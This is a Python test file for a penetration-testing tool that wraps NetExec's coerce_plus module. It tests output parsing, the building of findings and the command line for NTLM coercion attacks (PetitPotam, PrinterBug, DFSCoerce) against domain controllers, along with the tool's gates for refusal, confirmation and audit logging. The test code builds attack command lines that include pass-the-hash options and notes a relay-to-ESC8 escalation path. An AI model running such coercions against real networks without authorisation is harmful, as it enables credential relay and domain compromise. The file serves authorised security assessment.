"""Coercion parser + nxc argv + findings - pure, no nxc/DC needed.

Fixtures mimic `nxc smb -M coerce_plus -o LISTENER=...` stdout. The exact module line
format is unverified in-sandbox (see docs/COERCION.md / engines/coerce.py); this fixture is
the source of truth - adjust it against real output on Kali. Run:
    python tests/test_coerce.py    (or)   python -m pytest -q
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from redness.engines import coerce  # noqa: E402
from redness.findings import Category, Severity  # noqa: E402

# Multi-vector run: 3 vectors coerced, 1 patched, plus non-verdict noise lines.
COERCE = r"""
COERCE_PLUS  10.10.0.5   445    DC01   [*] Checking coercion methods against DC01
COERCE_PLUS  10.10.0.5   445    DC01   Target is vulnerable to PetitPotam (MS-EFSR)!
COERCE_PLUS  10.10.0.5   445    DC01   Coercion successful via PrinterBug (MS-RPRN)
COERCE_PLUS  10.10.0.5   445    DC01   DFSCoerce (MS-DFSNM): authentication received on 10.10.0.240
COERCE_PLUS  10.10.0.5   445    DC01   ShadowCoerce (MS-FSRVP) is not vulnerable (patched)
"""

# All patched/failed: verdicts present, but none coerced.
COERCE_NONE = r"""
COERCE_PLUS  10.10.0.5   445    SRV1   PetitPotam (MS-EFSR) is not vulnerable
COERCE_PLUS  10.10.0.5   445    SRV1   PrinterBug (MS-RPRN): failed - patched
"""


def test_parse_coerce_plus_mixed():
    results = coerce.parse_coerce_plus(COERCE)
    assert [(r.method, r.coerced) for r in results] == [
        ("petitpotam", True),
        ("printerbug", True),
        ("dfscoerce", True),
        ("shadowcoerce", False),      # "not vulnerable" -> negative beats the "vulnerable" substring
    ]


def test_parse_coerce_plus_none():
    results = coerce.parse_coerce_plus(COERCE_NONE)
    assert [(r.method, r.coerced) for r in results] == [
        ("petitpotam", False), ("printerbug", False)]


def test_parse_coerce_plus_empty():
    assert coerce.parse_coerce_plus("") == []
    assert coerce.parse_coerce_plus("COERCE_PLUS  10.10.0.5  445  DC01  nothing here\n") == []


def test_build_findings_dc_is_critical():
    findings = coerce.build_findings(coerce.parse_coerce_plus(COERCE),
                                     target="DC01", is_dc=True, listener="10.10.0.240")
    # only the 3 coerced vectors emit; shadowcoerce (patched) does not
    assert [f.id for f in findings] == [
        "coercion-petitpotam", "coercion-printerbug", "coercion-dfscoerce"]
    for f in findings:
        assert f.severity is Severity.CRITICAL      # DC target -> CRITICAL
        assert f.category is Category.CONFIG
        assert f.affected == ["DC01"]
        assert f.remediation                        # every vector carries a fix
        assert "10.10.0.240" in f.evidence[0].detail
        assert "T1187" in f.references[0]
        assert "credentials" not in f.meta          # coerce recovers no usable credential
    # DC impact calls out the relay->ESC8->DA escalation
    assert "ESC8" in findings[0].impact


def test_build_findings_non_dc_is_high():
    findings = coerce.build_findings(coerce.parse_coerce_plus(COERCE),
                                     target="SRV1", is_dc=False, listener="10.10.0.240")
    assert len(findings) == 3
    assert all(f.severity is Severity.HIGH for f in findings)
    assert "ESC8" not in findings[0].impact         # no DC-escalation line on a member server


def test_build_findings_none_when_nothing_coerced():
    assert coerce.build_findings(coerce.parse_coerce_plus(COERCE_NONE),
                                 target="SRV1", is_dc=False) == []


def test_petitpotam_carries_advisory_reference():
    findings = coerce.build_findings([coerce.CoerceResult("petitpotam", True)], target="DC01")
    assert any("ADV210003" in r for r in findings[0].references)


def test_coerce_argv_all_methods_credentialed():
    argv = coerce.coerce_argv("dc01", "10.10.0.240", method="all",
                              username="u", password="p", domain="acme")
    assert argv == ["smb", "dc01", "-u", "u", "-p", "p", "-d", "acme",
                    "-M", "coerce_plus", "-o", "LISTENER=10.10.0.240"]
    assert not any(a.startswith("METHOD=") for a in argv)   # no METHOD for an all-vector run


def test_coerce_argv_single_method_and_hash_kerberos():
    argv = coerce.coerce_argv("dc01", "10.0.0.9", method="petitpotam",
                              username="u", nthash="aad3b...", kerberos=True)
    assert "-H" in argv and "aad3b..." in argv
    assert "-k" in argv
    assert "-o" in argv and "METHOD=PetitPotam" in argv


# --- run_coerce orchestration (inject the nxc + DC-check boundaries; no nxc/DC) --- #
import tempfile  # noqa: E402

from redness.coerce import run_coerce  # noqa: E402


def _nxc_stub(out=COERCE):
    return lambda argv: out


def test_run_coerce_credentialed_dc_is_critical():
    report, res = run_coerce("10.10.0.5", "10.10.0.240", username="u", password="p",
                             loot_dir=tempfile.mkdtemp(), nxc_run=_nxc_stub(),
                             dc_check=lambda t: True)
    assert res.refused is False and res.is_dc is True
    assert [f.id for f in report.findings] == [
        "coercion-petitpotam", "coercion-printerbug", "coercion-dfscoerce"]
    assert all(f.severity is Severity.CRITICAL for f in report.findings)


def test_run_coerce_refuses_uncredentialed_without_force():
    called = {"n": 0}

    def _run(argv):
        called["n"] += 1
        return COERCE

    report, res = run_coerce("10.10.0.5", "10.10.0.240", nxc_run=_run, dc_check=lambda t: True)
    assert res.refused and res.reason == "uncredentialed"
    assert called["n"] == 0                                  # never fired the RPC
    assert report.findings == []


def test_force_alone_insufficient_without_confirm():
    _, res = run_coerce("10.10.0.5", "10.10.0.240", force=True, confirm_force=lambda r: False,
                        nxc_run=_nxc_stub(), dc_check=lambda t: True)
    assert res.refused and res.reason == "uncredentialed"    # --force needs the FORCE confirm too


def test_uncredentialed_force_confirmed_fires():
    seen = {"reason": None}

    def _confirm(reason):
        seen["reason"] = reason
        return True

    report, res = run_coerce("10.10.0.5", "10.10.0.240", force=True, confirm_force=_confirm,
                             loot_dir=tempfile.mkdtemp(), nxc_run=_nxc_stub(),
                             dc_check=lambda t: True)
    assert res.refused is False and len(report.findings) == 3
    assert seen["reason"] == "uncredentialed"                # the FORCE gate was consulted


def test_run_coerce_refuses_non_dc():
    called = {"n": 0}

    def _run(argv):
        called["n"] += 1
        return COERCE

    _, res = run_coerce("10.10.0.9", "10.10.0.240", username="u", password="p",
                        nxc_run=_run, dc_check=lambda t: False)
    assert res.refused and res.reason == "not-a-dc"
    assert called["n"] == 0                                  # no RPC to a non-DC


def test_run_coerce_non_dc_allowed_is_high():
    report, res = run_coerce("10.10.0.9", "10.10.0.240", username="u", password="p",
                             target_not_dc_ok=True, loot_dir=tempfile.mkdtemp(),
                             nxc_run=_nxc_stub(), dc_check=lambda t: False)
    assert res.refused is False and res.is_dc is False
    assert len(report.findings) == 3
    assert all(f.severity is Severity.HIGH for f in report.findings)


def test_run_coerce_writes_audit_log():
    d = tempfile.mkdtemp()
    run_coerce("10.10.0.5", "10.10.0.240", username="u", password="p",
               loot_dir=d, nxc_run=_nxc_stub(), dc_check=lambda t: True)
    with open(os.path.join(d, "coerce_audit.log"), encoding="utf-8") as fh:
        log = fh.read()
    assert "method=petitpotam" in log and "result=coerced" in log
    assert "method=shadowcoerce" in log and "result=not-vulnerable" in log  # patched vector logged too
    assert "target=10.10.0.5" in log and "listener=10.10.0.240" in log


def test_audit_log_records_refusals():
    d = tempfile.mkdtemp()
    run_coerce("10.10.0.5", "10.10.0.240", loot_dir=d, dc_check=lambda t: True)   # uncredentialed
    with open(os.path.join(d, "coerce_audit.log"), encoding="utf-8") as fh:
        assert "result=refused-uncredentialed" in fh.read()


if __name__ == "__main__":
    passed = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            fn()
            print(f"  ok  {name}")
            passed += 1
    print(f"\n{passed} tests passed")
